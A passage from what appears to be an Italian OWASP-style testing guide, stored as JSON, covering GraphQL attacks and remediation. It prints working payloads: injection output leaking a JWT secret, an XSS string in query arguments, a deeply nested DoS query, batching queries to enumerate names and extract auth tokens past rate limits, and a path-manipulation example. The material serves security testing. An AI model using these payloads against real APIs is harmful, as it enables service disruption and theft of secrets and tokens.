}</code></pre><p>Risposta:</p><pre><code>{ \"data\" : { \"dogs\" : [ { \"id\" : 1 , \"name\" : \"Abi\" }, ... , { \"id\" : 50 , \"name\" : \"$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^\" } ] } }</code></pre><p>La query contiene il segreto che firma i JWT dell’applicazione di esempio, un’informazione altamente sensibile.</p><p>Per capire cosa cercare in una data applicazione, è utile raccogliere informazioni su come è costruita e come sono organizzate le tabelle del database. Puoi usare anche strumenti come sqlmap per cercare path di iniezione e automatizzare l’estrazione di dati.</p><p>L’XSS si verifica quando un attaccante inietta codice eseguibile che viene poi eseguito dal browser. Per saperne di più consulta il capitolo sull’Input Validation. Puoi testare per XSS riflesso usando un payload dal capitolo Testing for Reflected Cross Site Scripting.</p><p>In questo esempio, errori potrebbero riflettere l’input e causare XSS.</p><p>Payload:</p><pre><code>query xss { myInfo ( veterinaryId : \"<script>alert('1')</script>\" , accessToken : \"<script>alert('1')</script>\" ) { id name } }</code></pre><p>Risposta:</p><pre><code>{ \"data\" : null , \"errors\" : [ { \"message\" : \"Validation error of type WrongType: argument 'veterinaryId' ...\" } ] }</code></pre><p>GraphQL espone un’interfaccia semplice per consentire query e oggetti annidati. Questa possibilità può essere abusata inviando query profondamente annidate, simili a ricorsioni, che causano un denial of service saturando CPU, memoria o altre risorse.</p><p>Come mostrato nella Figura 12.1-1, si può creare un loop dove un oggetto Dog contiene un oggetto Veterinary e viceversa. Questo permette un annidamento infinito di oggetti.</p><p>Si può così costruire una query profonda che rischia di sovraccaricare l’applicazione:</p><pre><code>query dos { allDogs ( onlyFree : false , limit : 1000000 ) { id name veterinary { id name dogs { id name ... } } } }</code></pre><p>Esistono varie misure di sicurezza (vedi Remediation) per prevenire questi attacchi. Query abusive possono causare DoS e devono essere considerate nel testing.</p><p>GraphQL permette il batching, cioè l’invio di più query in una sola richiesta. Questo consente agli utenti di richiedere più oggetti o istanze in modo efficiente. Un attaccante può sfruttare questa funzionalità per eseguire un batching attack. Invece di inviare molte richieste, che potrebbero essere bloccate da un WAF o un rate limiter come Nginx, si possono batchare più query in poche richieste, aggirando i controlli. Esempio:</p><pre><code>query { Veterinary ( id : \"1\" ) { name } second : Veterinary ( id : \"2\" ) { name } }</code></pre><p>Questo permette di ottenere rapidamente i nomi dei veterinari, da usare in seguito per estrarre i token auth. Esempio:</p><pre><code>query { auth ( veterinaryName : \"Julien\" ) second : auth ( veterinaryName : \"Benoit\" ) }</code></pre><p>I batching attack possono aggirare molti controlli di sicurezza, permettere l’enumerazione di oggetti e forzare informazioni sensibili.</p><p>GraphQL può restituire errori inaspettati durante il runtime che rivelano dettagli interni o configurazioni dell’applicazione. Un utente malintenzionato può sfruttare queste informazioni. È buona prassi testare i messaggi di errore inviando dati inattesi (fuzzing) e cercando informazioni sensibili.</p><p>GraphQL è relativamente recente e molte applicazioni stanno migrando dalle vecchie API. Spesso GraphQL viene usato come API standard che traduce le richieste/richieste in GraphQL verso una API sottostante. Se queste richieste non sono adeguatamente autorizzate, possono causare escalation di privilegi.</p><p>Ad esempio, una richiesta con il parametro id=1/delete potrebbe essere interpretata come /api/users/1/delete. Questo può essere esteso alla manipolazione di altre risorse dell’utente 1. È anche possibile che la richiesta venga eseguita con i privilegi del nodo GraphQL e non del vero richiedente.</p><p>Un tester dovrebbe tentare di accedere ai metodi API sottostanti per verificare possibili escalation di privilegi.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>GraphQL Playground</li><li>GraphQL Voyager</li><li>sqlmap</li><li>InQL (estensione Burp)</li><li>GraphQL Raider (estensione Burp)</li><li>GraphQL (add-on per ZAP)</li></ul><h3>Riferimenti</h3><ul><li>poc-graphql</li><li>Sito ufficiale GraphQL</li><li>Howtographql - Sicurezza</li><li>GraphQL Constraint Directive</li><li>Test lato client (XSS e altre vulnerabilità)</li><li>5 Common GraphQL Security Vulnerabilities</li><li>GraphQL common vulnerabilities and how to exploit them</li><li>GraphQL CS</li></ul>",
      "remediation": "<h3>Remediation</h3><ul><li>Restringi l’accesso alle introspection query.</li><li>Implementa la validazione dell’input. GraphQL non offre nativamente la validazione, ma esiste un progetto open source chiamato “graphql-constraint-directive” che consente di validare gli input nello schema. La sola validazione dell’input è utile, ma non basta: vanno adottate anche altre misure per mitigare gli attacchi di injection.</li><li>Implementa misure di sicurezza per prevenire query abusive: timeout (limita la durata massima delle query), profondità massima di query (limita l’annidamento), complessità massima delle query, throttling basato sul tempo server o sulla complessità delle query.</li><li>Invia messaggi di errore generici, che non rivelino dettagli interni.</li><li>Mitiga i batching attack: aggiungi limiti al numero di richieste per oggetto, impedisci il batching per oggetti sensibili, limita il numero di query per volta.</li></ul><p>Per ulteriori misure di remediation consulta la GraphQL Cheat Sheet.</p>",
      "test_objectives": ""
    }
}